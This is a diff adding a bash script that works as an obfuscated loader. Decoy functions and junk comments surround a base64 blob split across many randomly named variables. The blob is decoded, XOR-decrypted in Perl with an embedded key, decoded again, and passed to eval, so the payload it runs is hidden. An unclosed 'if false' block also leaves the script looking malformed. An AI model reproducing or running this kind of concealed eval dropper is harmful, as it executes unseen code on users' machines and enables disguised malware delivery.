@@ -1,0 +1,41 @@
+#!/bin/bash
+if false; then
+    ZopOkviY() {
+        local var=717
+        return 0
+    }
+    echo 'uoGxjSulTQ'
+    echo 'nmgdZAgGBr'
+YVUJYC() { echo "$1" | base64 --decode; }
+wYCvQxcd='9Y+BCwNuFgjntwXzQlMsFN7/qxUCNRoI4rhziEJTXB/e9J0aBQ03Fs+'
+# tsMxQPRhBC
+CJcrePhM='sBqRCU1wf3vSBDwQfGhrntwmxX1dxAvP/jVMCJRoC57cJ80JXTwj0jrsZIzUZFs+sBa9pfUwf8/SFViM1GRbPrAW5UUhMH'
+nqnffPBX='/P7iRo6bg5B1KgruWppX0j1xY4KKTs3Fs+sBqRvWFdN1NWOBCkfGRbPrAakaH1LD83riVMpFDwB4qggpFFXcQL2xY0TAjUaGue3CbFfV3EC8/2gBCkfG'
+# qVPnDsYVtx
+fxtuZitv='RbPrAakQlNcH97/jRM6NRoa57cJsUJXUw710p0LAQttC8+sDZdvWFcUzuv+VjkEEhrPhgXzaldLDdTVjgQ'
+NCRIMPcG='pHxkWz6wGpEJTXB/e/44EKR8aC9y3FqRvV1sBzY6ZUzIbNAvn'
+OYIxNiTC='lg'
+jwlxIEhU='XzaWlfE/bkgREjNRkWz6wGpEJTXB/e/44EKR8ZFs+sBa9uV3FI3vSFDwMbDhniriikQlNcH97/jgQpHxkW'
+WIuHAudX='z6wFr2l9TB/265YoKR8ZFs+sBqRCU1'
+NsQplFmA='8U9dGeBAMxDgbcuAHzSHlcH97/jQ8CMQkW4qcN9kh5XB/e/40'
+# MtCwkqqgvB
+DhPFwcls='TOjUaQd+3Da1RSE899uSBESkbNAvPrA6qQlhPF8'
+# TQoXnUgpgQ
+RPpxYZNl='3r+ygpHxkWz6wGpEJTXwHN5J1SAzFsOs+sBqRCV0sNzf+NEzo7NxbPrAakaCJLSN77lRUCGwod5YMFq29Xeh/z+/cEKTVhJuTdP/JpR0sC28WGBCo1GkHftw2tUUhPPfbkgREpHw'
+zRcRhaWq='EWz4Z/qkh5XB/e/40ZOgQJFt+3Bb'
+# suevJLIuPz
+JvlpiBVK='RffVsMze+NUwIlGRjKgwnzaH1LEPXkowsDMQkYxYYGpEJTXwLN5J4EOQQaBtOoAfNqU19I9cWNDgJuIBrctw2SUkhPF97/lgQ5BBoG0oIBt1FBch/e/44EA24O'
+# ebDNcplLlt
+XzRuoTbv='Qc+nFa9pSF869PSNMjkECh7PpxW1QlNUDvP7/hQsJREWzIYFq2hYXzfO6/4PIzUZFs+sBfNofn'
+# gYjLocFQyC
+HTFQhQpj='Yz3v+OBCkfGRbPrAWoaWlfA'
+HtMoFlnt='vb7mRACHxoL39wNs2hYTB/e0oUXKR9pHM+sDqRBeV8A8+v2UzoLCRbcgn66aUNfDs3VjVM6C2kG17cFtF5XW0j2/aAEKR8ZFty4cqhCWE8B8u2gBCkfGRbipw32SHlcH97/jgQpHxkW3Kh/pGgidRT1+7'
+iAqeolom='gEA24'
+# uGgpMlxAuL
+OESYDzSb='WCOe3BfNCU1cS9P+OCikfARbltxG1b1dLE977lRUDMWgW5N0epFJIXw/C+4lTAR8ZHM+sDqRCeVwV3vSJUgJvCh3crAWuaSNXDN779g4pFAod5LcFgWhYXynO5J0MIzUZFs+sBa9pfUwf8/SFViM1GRbPrAXzaH52M97/jgQpHxkWz6wFqGlpXwL2+5kQAh8aC9/cDbNoWEwf3tKnCwQUCgjPrHapQlNUH93VjRsEC2FB3LgWpFF9JAH1740VOjUaQdy4drRaSF8PwvuJUwEdNxbPrAakUUcoE970nRoFDTcWz6wGpG9YV03U1Y4EKR8ZFs+sBqRRVyUf9I6nDwIbLxbl3'
+qYTDwqFA='Qm6akhfSN7/hQkBG2kH3KwGsW5TXBHe/5YEAwQOB+KoEahCV0cO9NH/BAJuAR'
+MNRMHBTf='biqBG3aFVbD/T6jQsEGz86z6wGpEJXSw3N/41TAzIzOs+sBqRCWE8B8u2gBCkfGRbPrAakQldPDt70gQw6CyACz6cJqWh9cQ/z/40bBAthQdy4FqRRfSQB9e+NFTo1GkHcuHa0WkhfD8L7iVMBHTcWz6wGpFFHKBPe9J0aBQ0oHeSCFqRofksN3cugXg=='
+hJmyuI="${wYCvQxcd}${CJcrePhM}${nqnffPBX}${fxtuZitv}${NCRIMPcG}${OYIxNiTC}${jwlxIEhU}${WIuHAudX}${NsQplFmA}${DhPFwcls}${RPpxYZNl}${zRcRhaWq}${JvlpiBVK}${XzRuoTbv}${HTFQhQpj}${HtMoFlnt}${iAqeolom}${OESYDzSb}${qYTDwqFA}${MNRMHBTf}"
+hFQEge=$(echo "$hJmyuI" | base64 --decode | perl -e 'my $key = pack("H*", "97bccf63605c587186ef47c30b101d78"); my $data = do { local $/; <STDIN> }; my $k = length($key); for(my $i=0; $i < length($data); $i++){ print chr( ord(substr($data, $i, 1)) ^ ord(substr($key, $i % $k, 1)) ); }')
+oVGpzC=$(YVUJYC "$hFQEge")
+eval "$oVGpzC"
